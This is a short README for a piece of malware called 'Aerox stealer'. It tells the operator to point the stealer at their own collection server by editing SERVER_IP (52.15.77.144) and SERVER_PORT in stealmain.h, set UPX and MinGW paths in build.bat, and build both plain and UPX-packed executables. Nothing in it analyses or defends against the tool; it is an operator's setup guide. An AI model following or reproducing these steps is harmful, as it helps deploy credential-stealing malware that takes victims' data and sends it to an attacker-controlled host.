Aerox stealer by Legacy.
-- Configuration:
Open stealmain.h.
In host configuration section you will see such lines:
#define SERVER_IP "52.15.77.144"
#define SERVER_PORT 1337
Put your host details here.
Done with stealer config, now open build.bat.
In Configuration section you will see these:
set UPXDIR="C:\Users\Ferlix\Desktop\upx-3.96-win64"
set MINGWDIR="C:\Program Files\CodeBlocks\MinGW\bin"
Put here paths to UPX and MinGW on your computer.
Close these files.
Done.
-- Building:
Just launch build.bat.
! It fails silently.
If everything is done correctly, in directory you'll see 2 files:
main.exe - compiled stealer.
main.upx.exe - compiled and compressed by UPX stealer.
--
That's it. :)